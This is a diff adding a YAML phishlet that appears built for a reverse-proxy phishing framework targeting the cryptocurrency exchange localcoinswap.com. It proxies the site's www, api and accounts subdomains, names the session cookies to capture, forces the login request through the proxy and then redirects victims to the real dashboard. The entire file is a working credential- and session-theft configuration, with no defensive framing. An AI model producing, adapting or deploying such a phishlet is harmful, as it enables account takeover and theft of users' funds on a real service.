@@ -1,0 +1,22 @@
+name: 'localcoinswap'
+hostname: 'localcoinswap.com'
+subdomains:
+  - 'www'
+  - 'api'
+  - 'accounts'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'localcoinswap.com', session: true, is_landing: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'localcoinswap.com', session: true, is_landing: false}
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'localcoinswap.com', session: true, is_landing: false}
+
+auth_tokens:
+  - domain: '.localcoinswap.com'
+    keys: ['session_id', 'auth_token', 'remember_me']
+
+force_post:
+  - path: '/api/v1/auth/login'
+    search: '.*'
+    force: true
+    type: 'json'
+
+redirect_url: 'https://localcoinswap.com/dashboard'
